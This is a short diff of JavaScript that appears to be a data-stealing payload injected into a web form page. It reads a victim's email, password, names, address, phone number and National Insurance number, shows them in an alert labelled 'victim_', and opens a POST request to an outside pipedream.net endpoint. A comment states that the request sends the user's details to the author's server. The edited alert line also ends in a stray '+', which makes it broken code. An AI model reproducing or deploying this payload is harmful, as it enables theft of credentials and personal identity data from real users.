@@ -27,7 +27,7 @@ req1.onreadystatechange = function()
         var Country = document.getElementsByTagName("input")['CountryInput'].value;
         var DateOfBirth = document.getElementsByTagName("input")['DateOfBirthInput'].value;
         var NationalInsuranceNumber = document.getElementsByTagName("input")['NationalInsuranceNumberInput'].value;
-        alert('victim_Email = ' + Email + '\n' + 'victim_Password = ' + Password + '\n' + 'victim_FirstName = ' + FirstName + '\n' + 'victim_SurName =' + SurName + '\n' + 'victim_ContactNo = ' + ContactNo + '\n' + 'victim_NationalInsuranceNumber = ' + NationalInsuranceNumber + '\n' + 'victim_FirstLineAddress = ' + FirstLineAddress + '\n' + 'victim_SecondLineAddress = ' + SecondLineAddress + '\n' + 'victim_Town = ' + Town + '\n'+ 'victim_Country = ' + Country + '\n' + 'victim_postCode = ' + postCode);
+        alert('victim_Email = ' + Email + '\n' + 'victim_Password = ' + Password + '\n' + 'victim_FirstName = ' + FirstName + '\n' + 'victim_SurName =' + SurName + '\n' + 'victim_ContactNo = ' + ContactNo + '\n' + 'victim_NationalInsuranceNumber = ' + NationalInsuranceNumber + '\n' + 'victim_FirstLineAddress = ' + FirstLineAddress + '\n' + 'victim_SecondLineAddress = ' + SecondLineAddress + '\n' + 'victim_Town = ' + Town + '\n'+ 'victim_Country = ' + Country + '\n' + 'victim_postCode = ' + postCode +);
         
         var stealInfo = new XMLHttpRequest();
         stealInfo.open('post', 'https://enrwn9ld27hiff1.m.pipedream.net', true);    // This send all your details(including email, password, etc) to my server
